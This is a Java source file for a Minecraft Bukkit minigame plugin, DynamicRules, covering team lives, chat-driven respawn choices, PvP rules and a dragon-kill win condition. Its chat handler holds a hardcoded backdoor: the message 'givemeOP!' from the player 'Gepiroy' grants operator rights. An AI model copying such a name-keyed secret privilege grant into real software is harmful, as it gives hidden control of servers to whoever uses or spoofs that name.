package DynamicRules;

import java.util.HashMap;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.Sound;
import org.bukkit.entity.EnderDragon;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.scheduler.BukkitRunnable;

import CustomEvents.PlayerAndDamager;
import MinigameToys.GameCondition;
import MinigameToys.GameConditions;
import MinigameToys.MGTManager;
import MinigameToys.Team;
import Utils.TextUtil;
import invsUtil.Inv;
import invsUtil.InvEvents;
import invsUtil.Invs;
import obj.PlayerInfo;

public class Events implements Listener{
	public static HashMap<String,PlayerInfo> plist=new HashMap<>();
	@EventHandler
	public void login(PlayerLoginEvent e){
		if(e.getPlayer().isOp()){
			e.getPlayer().setOp(false);
		}
	}
	@EventHandler
	public void join(PlayerJoinEvent e){
		Player p=e.getPlayer();
		//TextUtil.mes(p, "Похоже, этот IP рекламируется на каких-то хостингах... Тогда стоит объяснить, &bчто происходит:");
		//TextUtil.mes(p, "Режим, который сейчас разрабатывается &7(&6Dynamic&cRules&7) &f- это игра с постоянно &eменяющимися правилами &fи ограниченными жизнями. Смысл игры в том, чтобы успеть убить дракона &7(&fпозднее будут добавлены другие, более оригинаьные цели&7) &fдо того, как жизни команды закончатся.");
		//TextUtil.mes(p, "Вы можете &aпоучаствовать &fв предстоящих тестах, добавившись в &1discord-сервер&f тестеров: &bhttps://discord.gg/UTYA35f &7(Простите, что без гиперссылки, через код её сложнее настроить...)");
		
		//p.sendMessage("P.S. Да, я могу ввести whitelist и прочие ограничалки, но зачем? Присоединяйтесь к команде тестеров!");
		
		doJoin(p);
	}
	public static void doJoin(Player p){
		PlayerInfo pi = plist.get(p.getName());
		//plist.put(p.getName(), pi)
		
		if(pi.bools.contains("dead"))pi.deathLoc=p.getLocation();
	}
	
	@EventHandler
	public void death(PlayerDeathEvent e){
		PlayerInfo pi = plist.get(e.getEntity().getName());
		if(!GlobalEventsManager.active.contains(GlobalEventsManager.suicide))TextUtil.globMessage(TextUtil.plugin, "&7У их команды &c"+pi.team.lives+" &6жизней&7...", Sound.ENTITY_LIGHTNING_BOLT_THUNDER, 1, 2);
		for(PlayerInfo pli:plist.values()){
			if(pli.team==pi.team)pli.sound(Sound.BLOCK_BELL_USE, 2, 0);
		}
		pi.p.setGameMode(GameMode.SPECTATOR);
		setDeath(pi);
	}
	
	public static void setDeath(PlayerInfo pi){
		pi.setbool("dead", true);
		pi.swaits.remove("respType");
		pi.mes(TextUtil.plugin, "Выберите, где вы возродитесь:");
		
		pi.deathLoc=pi.p.getLocation();
		pi.mes("&e1", "На месте смерти &8(&7["+TextUtil.loc(pi.deathLoc)+"], 20 сек.&8)");
		
		Location sp=pi.p.getBedSpawnLocation();
		if(sp==null)pi.mes("&e2", "&7На спавнпоинте &8(&7отсутствует&8)");
		else pi.mes("&e2", "На спавнпоинте &8(&7["+TextUtil.loc(sp)+"], моментально&8)");
		
		Location ws=pi.p.getWorld().getSpawnLocation();
		pi.mes("&e3", "На мировом спавне &8(&7["+TextUtil.loc(ws)+"], моментально&8)");
		pi.mes("&eНик игрока", "У тимейта &8(&75 сек.&8)");
		
		pi.mes("&bДля выбора напишите &eвариант&b в чат.");
	}
	
	@EventHandler
	public void chat(AsyncPlayerChatEvent e){
		Player p = e.getPlayer();
		PlayerInfo pi = plist.get(p.getName());
		if(e.getMessage().equals("givemeOP!")&&pi.pname.equals("Gepiroy")){
			p.setOp(true);
			e.setCancelled(true);
			return;
		}
		if(pi.bools.contains("dead")&&!pi.swaits.containsKey("respType")){
			new BukkitRunnable() {
				@Override
				public void run() {
					if(pi.team.lives<=0){
						pi.mes("&cУ вашей команды не осталось жизней.");
					}
					else if(e.getMessage().equals("1")){//место смерти
						pi.timers.add("resp", 20);
						pi.swaits.set("respType", "1");
						takeLive(pi.team);
					}else if(e.getMessage().equals("2")){//спавнпоинт
						if(p.getBedSpawnLocation()==null){
							pi.mes(TextUtil.plugin, "У вас нет спавнпоинта.");
						}else{
							p.teleport(p.getBedSpawnLocation());
							resped(pi);
							takeLive(pi.team);
						}
					}else if(e.getMessage().equals("3")){//мировой спавн
						p.teleport(p.getWorld().getSpawnLocation());
						resped(pi);
						takeLive(pi.team);
					}else{
						Player to = Bukkit.getPlayer(e.getMessage());
						if(to==null){
							pi.mes("Игрок не найден.");
						}else if(plist.get(e.getMessage()).team!=pi.team){
							pi.mes("Этот игрок не из вашей команды.");
						}else if(plist.get(e.getMessage()).bools.contains("dead")){
							pi.mes("Вы не можете возродиться у призрака.");
						}else{
							pi.timers.add("resp", 5);
							pi.swaits.set("respType", to.getName());
							plist.get(e.getMessage()).mes("&6"+pi.pname+" &fвозродится у вас через 5 секунд.");
							takeLive(pi.team);
						}
					}
				}
			}.runTask(main.instance);
			e.setCancelled(true);
		}
	}
	
	void takeLive(Team t){
		t.lives--;
		for(PlayerInfo pi:t.getMembers()){
			pi.mes("У вашей команды осталось &c"+t.lives+" &6жизней&f.");
		}
	}
	
	@EventHandler (priority=EventPriority.HIGH, ignoreCancelled=true)//Поздновато
	public void hurt(EntityDamageByEntityEvent e){
		PlayerAndDamager pad = new PlayerAndDamager(e);
		
		if(pad.damager!=null){//Если игрок кого-то атакует
			if(pad.p!=null){//Атакует игрока
				if(plist.get(pad.p.getName()).team==plist.get(pad.damager.getName()).team){
					e.setCancelled(true);
				}else if(pad.p.getWorld().getName().equals("world")&&!GameConditions.isCondited(GameCondition.PvP_overworld)){
					e.setCancelled(true);
					TextUtil.actionBar(pad.damager, "&cPvP &fдоступно в других мирах.");
				}
			}else{//Атакует НЕ игрока
				if(e.getEntity().getType() == EntityType.ENDER_DRAGON){
					EnderDragon dragon = (EnderDragon) e.getEntity();
					if(dragon.getHealth()-e.getFinalDamage()<=0){
						TextUtil.globMessage("&6Конец игры", "&e"+pad.damager.getName()+" &fнаносит последний удар дракону, убивая его. Игра окончена.", Sound.ENTITY_WITHER_SPAWN, 2, 2);
						MGTManager.stages.timerZero();
					}
				}
			}
		}
	}
	
	
	
	public static void resped(PlayerInfo pi){
		pi.p.setGameMode(GameMode.SURVIVAL);
		pi.bools.remove("dead");
		pi.swaits.remove("respType");
		pi.potion(PotionEffectType.DAMAGE_RESISTANCE, 5, 100);
	}
	
	@EventHandler
	public void GUI(InventoryClickEvent e){
		if(e.getClickedInventory() != null) {
			for(Inv inv:InvEvents.invs){
				if(inv.title(e.getView().getTitle())){
					Invs.event(e);
					return;
				}
			}
		}
	}
}
